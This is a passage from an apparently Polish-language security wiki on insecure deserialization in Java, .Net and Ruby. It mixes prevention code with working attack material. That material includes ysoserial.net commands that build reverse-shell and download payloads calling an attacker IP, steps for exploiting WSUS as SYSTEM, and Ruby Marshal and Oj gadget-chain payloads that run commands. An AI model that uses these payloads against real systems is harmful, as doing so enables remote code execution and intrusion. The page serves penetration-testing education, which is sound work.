- **RMI over HTTP**: Ta metoda jest powszechnie używana przez aplikacje typu thick client oparte na Javie, wykorzystując serializację do całej komunikacji obiektów.
- **JMX (Java Management Extensions)**: JMX wykorzystuje serializację do przesyłania obiektów przez sieć.
- **Custom Protocols**: W Javie standardową praktyką jest przesyłanie surowych obiektów Java, co zostanie pokazane w nadchodzących przykładach exploitów.

### Prevention

#### Transient objects

A class that implements `Serializable` can implement as `transient` any object inside the class that shouldn't be serializable. For example:
```java
public class myAccount implements Serializable
{
private transient double profit; // declared transient
private transient double margin; // declared transient
```
#### Unikaj serializacji klasy, która musi implementować `Serializable`

W sytuacjach, gdy pewne **obiekty muszą implementować `Serializable`** z powodu hierarchii klas, istnieje ryzyko niezamierzonej deserializacji. Aby temu zapobiec, upewnij się, że te obiekty są niemożliwe do deserializacji, definiując `final` metodę `readObject()`, która konsekwentnie rzuca wyjątek, jak pokazano poniżej:
```java
private final void readObject(ObjectInputStream in) throws java.io.IOException {
throw new java.io.IOException("Cannot be deserialized");
}
```
#### **Zwiększanie bezpieczeństwa deserializacji w Java**

**Dostosowanie `java.io.ObjectInputStream`** jest praktycznym podejściem do zabezpieczania procesów deserializacji. Ta metoda jest odpowiednia, gdy:

- Kod deserializacji jest pod Twoją kontrolą.
- Klasy oczekiwane do deserializacji są znane.

Nadpisz metodę **`resolveClass()`**, aby ograniczyć deserializację tylko do dozwolonych klas. Uniemożliwia to deserializację jakiejkolwiek klasy poza tymi wyraźnie dozwolonymi, na przykład w poniższym przykładzie, który ogranicza deserializację tylko do klasy `Bicycle`:
```java
// Code from https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
public class LookAheadObjectInputStream extends ObjectInputStream {

public LookAheadObjectInputStream(InputStream inputStream) throws IOException {
super(inputStream);
}

/**
* Only deserialize instances of our expected Bicycle class
*/
@Override
protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
if (!desc.getName().equals(Bicycle.class.getName())) {
throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
}
return super.resolveClass(desc);
}
}
```
**Using a Java Agent for Security Enhancement** oferuje rozwiązanie awaryjne, gdy modyfikacja kodu nie jest możliwa. Ta metoda ma zastosowanie głównie do **blacklisting harmful classes**, używając parametru JVM:
```
-javaagent:name-of-agent.jar
```
Zapewnia sposób na dynamiczne zabezpieczenie deserializacji, idealny dla środowisk, w których natychmiastowe zmiany w kodzie są niepraktyczne.

Check and example in [rO0 by Contrast Security](https://github.com/Contrast-Security-OSS/contrast-rO0)

**Implementacja filtrów serializacji**: Java 9 wprowadził filtry serializacji za pomocą interfejsu **`ObjectInputFilter`**, zapewniając potężny mechanizm określania kryteriów, które zserializowane obiekty muszą spełniać przed ich deserializacją. Filtry te można zastosować globalnie lub dla pojedynczego strumienia, oferując szczegółową kontrolę nad procesem deserializacji.

Aby wykorzystać filtry serializacji, można ustawić filtr globalny mający zastosowanie do wszystkich operacji deserializacji lub skonfigurować go dynamicznie dla konkretnych strumieni. Na przykład:
```java
ObjectInputFilter filter = info -> {
if (info.depth() > MAX_DEPTH) return Status.REJECTED; // Limit object graph depth
if (info.references() > MAX_REFERENCES) return Status.REJECTED; // Limit references
if (info.serialClass() != null && !allowedClasses.contains(info.serialClass().getName())) {
return Status.REJECTED; // Restrict to allowed classes
}
return Status.ALLOWED;
};
ObjectInputFilter.Config.setSerialFilter(filter);
```
**Wykorzystanie bibliotek zewnętrznych do zwiększenia bezpieczeństwa**: Biblioteki takie jak **NotSoSerial**, **jdeserialize** i **Kryo** oferują zaawansowane funkcje do kontrolowania i monitorowania Java deserialization. Mogą zapewnić dodatkowe warstwy bezpieczeństwa, takie jak whitelisting lub blacklisting klas, analizowanie serialized objects przed deserialization oraz wdrażanie niestandardowych strategii serialization.

- **NotSoSerial** przechwytuje procesy deserialization, aby zapobiegać wykonaniu nieufnego kodu.
- **jdeserialize** pozwala na analizę serialized Java objects bez ich deserialization, pomagając identyfikować potencjalnie złośliwą zawartość.
- **Kryo** jest alternatywnym frameworkiem serialization, kładącym nacisk na szybkość i wydajność, oferując konfigurowalne strategie serialization, które mogą zwiększyć bezpieczeństwo.

### References

- [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- Deserialization and ysoserial talk: [http://frohoff.github.io/appseccali-marshalling-pickles/](http://frohoff.github.io/appseccali-marshalling-pickles/)
- [https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
- [https://www.youtube.com/watch?v=VviY3O-euVQ](https://www.youtube.com/watch?v=VviY3O-euVQ)
- Talk about gadgetinspector: [https://www.youtube.com/watch?v=wPbW6zQ52w8](https://www.youtube.com/watch?v=wPbW6zQ52w8) and slides: [https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf](https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf)
- Marshalsec paper: [https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)
- [https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr](https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr)
- [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)
- [https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html](https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html)
- Java and .Net JSON deserialization **paper:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** talk: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) and slides: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
- Deserialziations CVEs: [https://paper.seebug.org/123/](https://paper.seebug.org/123/)

## JNDI Injection & log4Shell

Znajdź, czym jest **JNDI Injection, jak go nadużywać przez RMI, CORBA & LDAP oraz jak wykorzystać log4shell** (oraz przykład tej luki) na następującej stronie:


{{#ref}}
jndi-java-naming-and-directory-interface-and-log4shell.md
{{#endref}}

## JMS - Java Message Service

> **Java Message Service** (**JMS**) API to Java message-oriented middleware API do wysyłania wiadomości między dwoma lub więcej klientami. Jest implementacją służącą do rozwiązania problemu producent–konsument. JMS jest częścią Java Platform, Enterprise Edition (Java EE) i został zdefiniowany przez specyfikację opracowaną w Sun Microsystems, a następnie prowadzoną przez Java Community Process. Jest to standard komunikacji, który pozwala komponentom aplikacji opartym na Java EE tworzyć, wysyłać, odbierać i czytać wiadomości. Umożliwia komunikację między różnymi komponentami aplikacji rozproszonej w sposób luźno powiązany, niezawodny i asynchroniczny. (Źródło: [Wikipedia](https://en.wikipedia.org/wiki/Java_Message_Service)).

### Produkty

Istnieje kilka produktów używających tego middleware do wysyłania wiadomości:

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../images/image (314).png>)

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../images/image (1056).png>)

### Eksploatacja

Zasadniczo istnieje **wiele serwisów używających JMS w niebezpieczny sposób**. W związku z tym, jeśli masz **wystarczające uprawnienia** do wysyłania wiadomości do tych serwisów (zwykle potrzebne będą prawidłowe poświadczenia), możesz wysłać **malicious objects serialized, które zostaną deserialized przez consumer/subscriber**.\
Oznacza to, że w tym ataku wszyscy **klienci korzystający z tej wiadomości zostaną zainfekowani**.

Pamiętaj, że nawet jeśli serwis jest podatny (ponieważ insecurely deserializing dane od użytkownika), nadal musisz znaleźć odpowiednie gadgets, aby wykorzystać tę lukę.

Narzędzie [JMET](https://github.com/matthiaskaiser/jmet) powstało, aby **łączyć się i atakować te serwisy, wysyłając kilka malicious objects serialized przy użyciu znanych gadgets**. Te exploity zadziałają, jeśli serwis nadal jest podatny i jeśli którykolwiek z użytych gadgets znajduje się w podatnej aplikacji.

### References

- [Patchstack advisory – Everest Forms unauthenticated PHP Object Injection (CVE-2025-52709)](https://patchstack.com/articles/critical-vulnerability-impacting-over-100k-sites-patched-in-everest-forms-plugin/)

- JMET talk: [https://www.youtube.com/watch?v=0h8DWiOWGGA](https://www.youtube.com/watch?v=0h8DWiOWGGA)
- Slides: [https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf)

## .Net

W kontekście .Net, exploity związane z deserialization działają podobnie jak w Java — wykorzystuje się gadgets, aby uruchomić określony kod podczas deserialization obiektu.

### Fingerprint

#### WhiteBox

Kod źródłowy powinien być sprawdzony pod kątem wystąpień:

1. `TypeNameHandling`
2. `JavaScriptTypeResolver`

Należy skupić się na serializers, które pozwalają, aby typ był określany przez zmienną kontrolowaną przez użytkownika.

#### BlackBox

Poszukiwania powinny celować w Base64 encoded string **AAEAAAD/////** lub dowolny podobny wzorzec, który może zostać poddany deserialization po stronie serwera, dając możliwość kontroli nad typem, który zostanie deserialized. Może to obejmować, ale nie ogranicza się do, struktury **JSON** lub **XML** zawierające `TypeObject` lub `$type`.

### ysoserial.net

W tym przypadku możesz użyć narzędzia [**ysoserial.net**](https://github.com/pwntester/ysoserial.net), aby **tworzyć deserialization exploits**. Po pobraniu repozytorium git należy **skomilować narzędzie** np. przy użyciu Visual Studio.

Jeśli chcesz dowiedzieć się, **jak ysoserial.net tworzy swoje exploity**, możesz [**sprawdzić tę stronę, gdzie wyjaśniono ObjectDataProvider gadget + ExpandedWrapper + Json.Net formatter**](basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md).

Główne opcje **ysoserial.net** to: **`--gadget`**, **`--formatter`**, **`--output`** oraz **`--plugin`.**

- **`--gadget`** używane do wskazania gadgetu do nadużycia (wskazuje klasę/funkcję, która zostanie użyta podczas deserialization do wykonania poleceń).
- **`--formatter`**, używane do wskazania metody serializacji exploita (musisz wiedzieć, której biblioteki używa back-end do deserialization payloadu i użyć tej samej do serializacji).
- **`--output`** używane do wskazania, czy chcesz exploit w formie **raw** czy **base64**. _Zauważ, że **ysoserial.net** będzie **kodował** payload używając **UTF-16LE** (kodowanie domyślne w Windows), więc jeśli dostaniesz raw i po prostu zakodujesz go z konsoli linuxowej możesz mieć problemy z kompatybilnością encodingu, które uniemożliwią prawidłowe działanie exploita (w HTB JSON box payload zadziałał zarówno w UTF-16LE jak i ASCII, ale nie oznacza to, że zawsze tak będzie)._
- **`--plugin`** ysoserial.net wspiera pluginy do tworzenia **exploitów dla konkretnych frameworków** jak ViewState

#### More ysoserial.net parameters

- `--minify` zapewni **mniejszy payload** (jeśli to możliwe)
- `--raf -f Json.Net -c "anything"` to wskaże wszystkie gadgets, które można użyć z podanym formatterem (`Json.Net` w tym przypadku)
- `--sf xml` możesz **wskazać gadget** (`-g`) i ysoserial.net wyszuka formattery zawierające "xml" (case insensitive)

**ysoserial examples** to create exploits:
```bash
#Send ping
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64

#Timing
#I tried using ping and timeout but there wasn't any difference in the response timing from the web server

#DNS/HTTP request
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a" -o base64

#Reverse shell
#Create shell command in linux
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')" | iconv  -t UTF-16LE | base64 -w0
#Create exploit using the created B64 shellcode
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
```
**ysoserial.net** ma też **bardzo ciekawy parametr**, który pomaga lepiej zrozumieć, jak działa każdy exploit: `--test`\
Jeśli wskażesz ten parametr, **ysoserial.net** spróbuje wykonać **exploit** lokalnie, dzięki czemu możesz przetestować, czy Twój **payload** zadziała poprawnie.\
Ten parametr jest pomocny, ponieważ jeśli przejrzysz kod, znajdziesz fragmenty kodu podobne do poniższego (z [ObjectDataProviderGenerator.cs](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Generators/ObjectDataProviderGenerator.cs#L208)):
```java
if (inputArgs.Test)
{
try
{
SerializersHelper.JsonNet_deserialize(payload);
}
catch (Exception err)
{
Debugging.ShowErrors(inputArgs, err);
}
}
```
To oznacza, że aby przetestować exploit, kod wywoła [serializersHelper.JsonNet_deserialize](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Helpers/SerializersHelper.cs#L539)
```java
public static object JsonNet_deserialize(string str)
{
Object obj = JsonConvert.DeserializeObject<Object>(str, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
return obj;
}
```
W powyższym kodzie istnieje podatność na exploit, który został stworzony. Jeśli znajdziesz coś podobnego w aplikacji .Net, prawdopodobnie ta aplikacja też jest podatna.\  
Dlatego parametr **`--test`** pozwala nam zrozumieć, **które fragmenty kodu są podatne** na exploit deserializacji, który może wygenerować **ysoserial.net**.

### ViewState

Zobacz [ten POST o tym, **jak spróbować wykorzystać parametr \_\_ViewState w .Net**](exploiting-__viewstate-parameter.md), aby **wykonać dowolny kod.** Jeśli **już znasz sekrety** używane przez maszynę ofiary, [**przeczytaj ten post, aby dowiedzieć się, jak wykonać kod**](exploiting-__viewstate-knowing-the-secret.md).

### Real‑world sink: WSUS AuthorizationCookie & Reporting SOAP → BinaryFormatter/SoapFormatter RCE

- Dotknięte endpointy:
- `/SimpleAuthWebService/SimpleAuth.asmx` → GetCookie() AuthorizationCookie odszyfrowywany, a następnie deserializowany za pomocą BinaryFormatter.
- `/ReportingWebService.asmx` → ReportEventBatch i powiązane operacje SOAP prowadzące do sinków SoapFormatter; base64 gadget jest przetwarzany, gdy konsola WSUS przetwarza zdarzenie.
- Root cause: bajty kontrolowane przez atakującego trafiają do legacy .NET formatters (BinaryFormatter/SoapFormatter) bez ścisłych allow‑lists/binders, więc łańcuchy gadgetów wykonują się z uprawnieniami konta usługi WSUS (często SYSTEM).

Minimalne wykorzystanie (ścieżka Reporting):
1) Wygeneruj .NET gadget przy użyciu ysoserial.net (BinaryFormatter lub SoapFormatter) i wyprowadź base64, na przykład:
```powershell
# Reverse shell (EncodedCommand) via BinaryFormatter
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -o base64 -c "powershell -NoP -W Hidden -Enc <BASE64_PS>"

# Simple calc via SoapFormatter (test)
ysoserial.exe -g TypeConfuseDelegate -f SoapFormatter -o base64 -c "calc.exe"
```
2) Przygotuj SOAP dla `ReportEventBatch`, osadź w nim base64 gadget i wyślij metodą POST do `/ReportingWebService.asmx`.
3) Gdy administrator otworzy konsolę WSUS, zdarzenie zostanie zdeserializowane, a gadget się uruchomi (RCE jako SYSTEM).

AuthorizationCookie / GetCookie()
- Sfałszowany AuthorizationCookie może zostać zaakceptowany, odszyfrowany i przekazany do BinaryFormatter sink, umożliwiając pre‑auth RCE, jeśli jest osiągalny.

Parametry Public PoC (tecxx/CVE-2025-59287-WSUS):
```powershell
$lhost = "192.168.49.51"
$lport = 53
$targetURL = "http://192.168.51.89:8530"
```
See [Windows Local Privilege Escalation – WSUS](../../windows-hardening/windows-local-privilege-escalation/README.md)

### Zapobieganie

Aby ograniczyć ryzyko związane z deserializacją w .Net:

- **Unikaj pozwalania strumieniom danych na określanie typów obiektów.** Używaj `DataContractSerializer` lub `XmlSerializer`, gdy to możliwe.
- **Dla `JSON.Net`, ustaw `TypeNameHandling` na `None`:** `TypeNameHandling = TypeNameHandling.None`
- **Unikaj używania `JavaScriptSerializer` z `JavaScriptTypeResolver`.**
- **Ogranicz typy, które mogą być deserializowane**, zdając sobie sprawę z inherentnych ryzyk związanych z typami .Net, takich jak `System.IO.FileInfo`, który może modyfikować właściwości plików na serwerze, co może prowadzić do denial of service attacks.
- **Bądź ostrożny wobec typów posiadających ryzykowne właściwości**, takich jak `System.ComponentModel.DataAnnotations.ValidationException` z właściwością `Value`, która może być wykorzystana.
- **Bezpiecznie kontroluj instancjonowanie typów**, aby zapobiec wpływowi atakujących na proces deserializacji, co czyni nawet `DataContractSerializer` lub `XmlSerializer` podatnymi.
- **Wdróż kontrolę białej listy** używając niestandardowego `SerializationBinder` dla `BinaryFormatter` i `JSON.Net`.
- **Bądź na bieżąco ze znanymi insecure deserialization gadgets** w .Net i upewnij się, że deserializatory nie tworzą instancji takich typów.
- **Izoluj potencjalnie ryzykowny kod** od kodu mającego dostęp do internetu, aby nie eksponować znanych gadgetów, takich jak `System.Windows.Data.ObjectDataProvider` w aplikacjach WPF, na nieufne źródła danych.

### **References**

- Java and .Net JSON deserialization **paper:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** talk: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) and slides: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
- [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html#net-csharp](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html#net-csharp)
- [https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf)
- [https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization](https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization)

## **Ruby**

W Ruby serializacja jest realizowana przez dwie metody w bibliotece **marshal**. Pierwsza metoda, znana jako **dump**, służy do przekształcenia obiektu w strumień bajtów — jest to proces zwany serializacją. Natomiast druga metoda, **load**, jest używana do odtworzenia obiektu ze strumienia bajtów — proces znany jako deserializacja.

Aby zabezpieczyć zserializowane obiekty, **Ruby wykorzystuje HMAC (Hash-Based Message Authentication Code)**, zapewniając integralność i autentyczność danych. Klucz używany do tego celu jest przechowywany w jednym z następujących miejsc:

- `config/environment.rb`
- `config/initializers/secret_token.rb`
- `config/secrets.yml`
- `/proc/self/environ`

**Ruby 2.X generic deserialization to RCE gadget chain (więcej informacji w** [**https://www.elttam.com/blog/ruby-deserialization/**](https://www.elttam.com/blog/ruby-deserialization/)**):**
```ruby
#!/usr/bin/env ruby

# Code from https://www.elttam.com/blog/ruby-deserialization/

class Gem::StubSpecification
def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")#RCE cmd must start with "|" and end with "1>&2"

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
def marshal_dump
[$dependency_list]
end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
pipe.print payload
pipe.close_write
puts pipe.gets
puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```
Inny RCE chain do exploit Ruby On Rails: [https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/](https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/)

### Metoda Ruby .send()

Jak wyjaśniono w [**tym raporcie o podatności**](https://starlabs.sg/blog/2024/04-sending-myself-github-com-environment-variables-and-ghes-shell/), jeśli nieprzefiltrowane dane wejściowe od użytkownika trafią do metody `.send()` obiektu Ruby, ta metoda pozwala **wywołać dowolną inną metodę** obiektu z dowolnymi parametrami.

Na przykład wywołanie eval, a następnie przekazanie kodu Ruby jako drugiego parametru pozwoli wykonać dowolny kod:
```ruby
<Object>.send('eval', '<user input with Ruby code>') == RCE
```
Co więcej, jeśli tylko jeden parametr **`.send()`** jest kontrolowany przez atakującego, jak wspomniano w poprzednim writeup, możliwe jest wywołanie dowolnej metody obiektu, która **nie wymaga argumentów** lub której argumenty mają **wartości domyślne**.\
W tym celu można wyliczyć wszystkie metody obiektu, aby **znaleźć kilka interesujących metod, które spełniają te wymagania**.
```ruby
<Object>.send('<user_input>')

# This code is taken from the original blog post
# <Object> in this case is Repository
## Find methods with those requirements
repo = Repository.find(1)  # get first repo
repo_methods = [           # get names of all methods accessible by Repository object
repo.public_methods(),
repo.private_methods(),
repo.protected_methods(),
].flatten()

repo_methods.length()      # Initial number of methods => 5542

## Filter by the arguments requirements
candidate_methods = repo_methods.select() do |method_name|
[0, -1].include?(repo.method(method_name).arity())
end
candidate_methods.length() # Final number of methods=> 3595
```
### Ruby class pollution

Check how it could be possible to [pollute a Ruby class and abuse it in here](ruby-class-pollution.md).

### Ruby _json pollution

Gdy w body wyślesz wartości, które nie są hashable (np. array), zostaną one dodane do nowego klucza o nazwie `_json`. Jednak możliwe jest, że atakujący ustawi w body wartość `_json` z dowolnymi, spreparowanymi danymi. Wówczas, jeśli backend na przykład sprawdza poprawność parametru, ale jednocześnie używa parametru `_json` do wykonania jakiejś akcji, może dojść do obejścia autoryzacji.

Więcej informacji znajdziesz na [Ruby _json pollution page](ruby-_json-pollution.md).

### Other libraries

This technique was taken[ **from this blog post**](https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/?utm_source=pocket_shared).

Istnieją inne biblioteki Ruby, które mogą być użyte do serializacji obiektów i które z tego powodu mogą zostać wykorzystane do uzyskania RCE podczas insecure deserialization. Poniższa tabela pokazuje niektóre z tych bibliotek oraz metodę, która jest wywoływana w załadowanej klasie w momencie deserializacji (funkcja, którą można nadużyć, aby uzyskać RCE):

<table data-header-hidden><thead><tr><th width="179"></th><th width="146"></th><th></th></tr></thead><tbody><tr><td><strong>Biblioteka</strong></td><td><strong>Dane wejściowe</strong></td><td><strong>Metoda startowa wewnątrz klasy</strong></td></tr><tr><td>Marshal (Ruby)</td><td>Binary</td><td><code>_load</code></td></tr><tr><td>Oj</td><td>JSON</td><td><code>hash</code> (klasa musi zostać umieszczona w hash(map) jako klucz)</td></tr><tr><td>Ox</td><td>XML</td><td><code>hash</code> (klasa musi zostać umieszczona w hash(map) jako klucz)</td></tr><tr><td>Psych (Ruby)</td><td>YAML</td><td><code>hash</code> (klasa musi zostać umieszczona w hash(map) jako klucz)<br><code>init_with</code></td></tr><tr><td>JSON (Ruby)</td><td>JSON</td><td><code>json_create</code> ([zobacz notatki dotyczące json_create na końcu](#table-vulnerable-sinks))</td></tr></tbody></table>

Basic example:
```ruby
# Existing Ruby class inside the code of the app
class SimpleClass
def initialize(cmd)
@cmd = cmd
end

def hash
system(@cmd)
end
end

# Exploit
require 'oj'
simple = SimpleClass.new("open -a calculator") # command for macOS
json_payload = Oj.dump(simple)
puts json_payload

# Sink vulnerable inside the code accepting user input as json_payload
Oj.load(json_payload)
```
W przypadku próby wykorzystania Oj udało się znaleźć gadget class, która wewnątrz swojej funkcji `hash` wywoływała `to_s`, która z kolei wywoływała spec, a ta wywoływała fetch_path — co można było wykorzystać, aby zmusić ją do pobrania losowego URL, dając świetny detektor tego rodzaju unsanitized deserialization vulnerabilities.
```json
{
"^o": "URI::HTTP",
"scheme": "s3",
"host": "example.org/anyurl?",
"port": "anyport",
"path": "/",
"user": "anyuser",
"password": "anypw"
}
```
Co więcej, odkryto, że przy poprzedniej technice w systemie również tworzony jest folder, co jest wymagane, aby wykorzystać inny gadget i przekształcić to w pełne RCE za pomocą czegoś takiego:
```json
{
"^o": "Gem::Resolver::SpecSpecification",
"spec": {
"^o": "Gem::Resolver::GitSpecification",
"source": {
"^o": "Gem::Source::Git",
"git": "zip",
"reference": "-TmTT=\"$(id>/tmp/anyexec)\"",
"root_dir": "/tmp",
"repository": "anyrepo",
"name": "anyname"
},
"spec": {
"^o": "Gem::Resolver::Specification",
"name": "name",
"dependencies": []
}
}
}
```
Sprawdź więcej szczegółów w [**original post**](https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/?utm_source=pocket_shared).

### Bootstrap Caching

Not really a desearilization vuln but a nice trick to abuse bootstrap caching to to get RCE from a rails application with an arbitrary file write (find the complete [original post in here](https://blog.convisoappsec.com/en/from-arbitrary-file-write-to-rce-in-restricted-rails-apps/)).

Poniżej krótkie podsumowanie kroków szczegółowo opisanych w artykule dotyczących exploitowania arbitrary file write przez nadużycie Bootsnap caching:

- Identify the Vulnerability and Environment

Funkcjonalność uploadu plików w Rails app pozwala atakującemu na arbitralne zapisanie plików. Chociaż aplikacja działa z ograniczeniami (tylko niektóre katalogi jak tmp są zapisywalne z powodu użytkownika non-root w Docker), nadal pozwala to na zapis do katalogu cache Bootsnap (zwykle pod tmp/cache/bootsnap).

- Understand Bootsnap’s Cache Mechanism

Bootsnap przyspiesza czasy uruchamiania Rails przez cachowanie skompilowanego kodu Ruby, plików YAML i JSON. Przechowuje pliki cache zawierające cache key header (z polami takimi jak Ruby version, file size, mtime, compile options, itd.), po którym następuje skompilowany kod. Ten header jest używany do walidacji cache podczas startu aplikacji.

- Gather File Metadata

Atakujący najpierw wybiera plik docelowy, który prawdopodobnie jest ładowany podczas startu Rails (na przykład set.rb ze standardowej biblioteki Ruby). Wykonując kod Ruby wewnątrz kontenera, wyciągają krytyczne metadane (takie jak RUBY_VERSION, RUBY_REVISION, size, mtime i compile_option). Te dane są niezbędne do skonstruowania prawidłowego cache key.

- Compute the Cache File Path

Replikując mechanizm haszujący FNV-1a 64-bit używany przez Bootsnap, wyznacza się poprawną ścieżkę pliku cache. Ten krok zapewnia, że złośliwy plik cache zostanie umieszczony dokładnie tam, gdzie Bootsnap go oczekuje (np. pod tmp/cache/bootsnap/compile-cache-iseq/).

- Craft the Malicious Cache File

Atakujący przygotowuje payload, który:

- Executes arbitrary commands (for example, running id to show process info).
- Removes the malicious cache after execution to prevent recursive exploitation.
- Loads the original file (e.g., set.rb) to avoid crashing the application.

Ten payload jest skompilowany do binarnego kodu Ruby i połączony z starannie skonstruowanym cache key header (z użyciem wcześniej zebranych metadanych oraz właściwej wersji Bootsnap).

- Overwrite and Trigger Execution
Wykorzystując arbitrary file write, atakujący zapisuje przygotowany plik cache w obliczonej lokalizacji. Następnie wywołuje restart serwera (poprzez zapis do tmp/restart.txt, który jest monitorowany przez Puma). Podczas restartu, gdy Rails requires docelowy plik, ładowany jest złośliwy plik cache, co skutkuje remote code execution (RCE).



### Ruby Marshal exploitation in practice (updated)

Traktuj każdą ścieżkę, gdzie niezaufane bajty trafiają do `Marshal.load`/`marshal_load`, jako RCE sink. Marshal rekonstruuje arbitralne grafy obiektów i wywołuje callbacki bibliotek/gemów podczas materializacji.


- Minimalna podatna ścieżka kodu Rails:
```ruby
class UserRestoreController < ApplicationController
def show
user_data = params[:data]
if user_data.present?
deserialized_user = Marshal.load(Base64.decode64(user_data))
render plain: "OK: #{deserialized_user.inspect}"
else
render plain: "No data", status: :bad_request
end
end
end
```
- Powszechne klasy gadgetów spotykane w prawdziwych łańcuchach: `Gem::SpecFetcher`, `Gem::Version`, `Gem::RequestSet::Lockfile`, `Gem::Resolver::GitSpecification`, `Gem::Source::Git`.
- Typowy znacznik efektu ubocznego osadzany w payloadach (wykonywany podczas unmarshal):
```
*-TmTT="$(id>/tmp/marshal-poc)"any.zip
```
Gdzie to występuje w prawdziwych aplikacjach:
- Rails cache stores and session stores historically using Marshal
